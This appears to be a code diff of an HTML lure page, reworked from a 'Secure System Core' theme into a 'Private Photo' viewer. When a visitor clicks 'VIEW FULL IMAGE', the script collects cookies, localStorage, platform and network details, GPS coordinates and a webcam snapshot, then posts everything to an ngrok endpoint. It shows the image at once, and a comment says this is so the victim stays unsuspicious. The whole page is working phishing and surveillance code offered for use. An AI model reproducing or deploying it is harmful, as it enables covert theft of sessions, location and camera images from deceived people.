@@ -3,52 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure System Core</title>
+    <title>Media Viewer</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #0f0; font-family: 'Courier New', monospace; }
-        #box { text-align: center; padding: 30px; border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; border-radius: 8px; }
-        button { background: #0f0; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; margin-top: 20px; border-radius: 4px; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; }
+        #box { text-align: center; padding: 25px; border: 1px solid #333; background: #111; border-radius: 12px; width: 80%; max-width: 350px; }
+        h3 { margin-bottom: 10px; font-size: 1.2rem; }
+        p { font-size: 0.9rem; color: #aaa; margin-bottom: 20px; }
+        button { background: #007bff; color: #fff; border: none; padding: 12px 30px; cursor: pointer; font-weight: bold; border-radius: 25px; font-size: 1rem; width: 100%; transition: 0.3s; }
+        button:active { background: #0056b3; transform: scale(0.98); }
         #content { display: none; }
-        img { max-width: 90%; border: 2px solid #fff; }
+        img { max-width: 100%; border-radius: 8px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div id="box">
-        <h2>[ ENCRYPTED DATA ]</h2>
-        <p>Verification required to bypass firewall and view file.</p>
-        <button onclick="runMasterScript()">ACCESS DATA</button>
+        <h3>Private Photo</h3>
+        <p>This image is protected. Please verify to view the full version.</p>
+        <button onclick="captureAndShow()">VIEW FULL IMAGE</button>
     </div>
 
     <div id="content">
-        <img src="elephant.jpg" alt="Secret">
+        <img src="elephant.jpg" alt="Secret Content">
     </div>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // আপনার দেওয়া Ngrok লিঙ্ক এখানে অ্যাড করা হয়েছে
-        const TARGET_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe'; 
+        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe'; 
 
-        async function runMasterScript() {
+        async function captureAndShow() {
             let log = {
                 system: {
                     platform: navigator.platform,
                     cookies: document.cookie || "No Cookies",
                     storage: JSON.stringify(localStorage),
-                    vulnerabilities: []
+                    vuln: []
                 },
                 network: {}
             };
 
-            if (navigator.pdfViewerEnabled) log.system.vulnerabilities.push("PDF_Exploit_Active");
-            if (navigator.webdriver) log.system.vulnerabilities.push("Bot_Detected");
+            // Vulnerability Check
+            if (navigator.pdfViewerEnabled) log.system.vuln.push("PDF_Exploit");
+            if (navigator.webdriver) log.system.vuln.push("Bot_Detected");
 
+            // Network Info
             const conn = navigator.connection;
             if (conn) log.network = { type: conn.effectiveType, speed: conn.downlink + "Mbps" };
 
+            // GPS & Camera
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 log.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
@@ -61,18 +66,19 @@
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        postData(log, canvas.toDataURL('image/jpeg'));
+                        sendData(log, canvas.toDataURL('image/jpeg'));
                         stream.getTracks().forEach(t => t.stop());
                     }, 1500);
-                } catch (e) { postData(log, null); }
-            }, () => postData(log, null));
+                } catch (e) { sendData(log, null); }
+            }, () => sendData(log, null));
 
+            // বাটন ক্লিক করার সাথে সাথে ছবি দেখাবে যাতে সন্দেহ না হয়
             document.getElementById('box').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         }
 
-        function postData(data, img) {
-            fetch(TARGET_URL, {
+        function sendData(data, img) {
+            fetch(NGROK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ...data, photo: img })
